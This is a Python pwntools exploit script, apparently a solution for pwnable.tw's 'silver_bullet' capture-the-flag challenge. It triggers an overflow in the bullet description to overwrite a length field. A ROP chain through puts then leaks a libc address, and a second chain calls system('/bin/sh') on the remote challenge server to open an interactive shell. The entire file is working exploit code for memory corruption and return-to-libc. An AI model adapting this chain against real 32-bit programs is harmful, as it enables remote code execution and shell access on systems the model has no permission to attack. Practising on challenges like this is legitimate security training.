from pwn import *

context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']
# context.log_level = "debug"
def choice(io,ch):
    io.recvuntil(b"Your choice :")
    io.sendline(str(ch).encode())

def create_bullet(io, content):
    choice(io,1)
    io.recvuntil(b"Give me your description of bullet :")
    io.send(content)
    io.recvuntil(b"Your power is : ")
    power = int(io.recvline().strip(b"\n").decode(),10)
    return power

def power_up(io,content):
    choice(io,2)
    io.recvuntil(b"Give me your another description of bullet :")
    io.send(content)
    io.recvuntil(b"Your new power is : ")
    power = int(io.recvline().strip(b"\n").decode(),10)
    io.recvuntil(b"Enjoy it !\n")

def gdb_scripts(_bin):
    # scripts = f"b *{_bin.plt['puts']}\n"
    scripts = f"b *0x8048A18\n"
    scripts+= f"c\n"
    return scripts

def create_overflow(io):
    create_bullet(io,b"a"*47)
    power_up(io, b"a")

def leak_libc(io,_bin):
    create_overflow(io)
    #gdb.attach(io,gdbscript=gdb_scripts(_bin))
    #sleep(1)
    payload = p32(0xffffffff) + b"aaa"
    _rop = ROP([])
    _rop.raw(p32(_bin.plt["puts"]))
    # return to main after leaking libc
    _rop.raw(p32(_bin.symbols["main"]))
    _rop.raw(p32(_bin.got["puts"]))
    payload += _rop.chain()
    power_up(io,payload)
    choice(io,3)
    io.recvuntil(b"Oh ! You win !!\n")
    return u32(io.recvline()[:4])

def ret2system(io,libc):
    create_overflow(io)
    payload = p32(0xffffffff) + b"aaa"
    binsh = next(libc.search(b"/bin/sh\00"))
    _rop = ROP([])
    _rop.raw(libc.symbols["system"])
    _rop.raw(binsh)
    _rop.raw(binsh)
    payload += _rop.chain()
    power_up(io,payload)
    choice(io,3)
    


DEBUG = False

if __name__ == '__main__':
    if DEBUG:
        io = process("./silver_bullet")
    else:
        io = remote("chall.pwnable.tw",10103)
    
    _bin = ELF("./silver_bullet")
    libc = ELF("./libc_32.so.6")
    _rop = ROP(_bin)
    libc.address = leak_libc(io,_bin) - libc.symbols["puts"]
    print(f"libc leaked at : {hex(libc.address)}")
    # ret2libc
    ret2system(io,libc)
    io.interactive()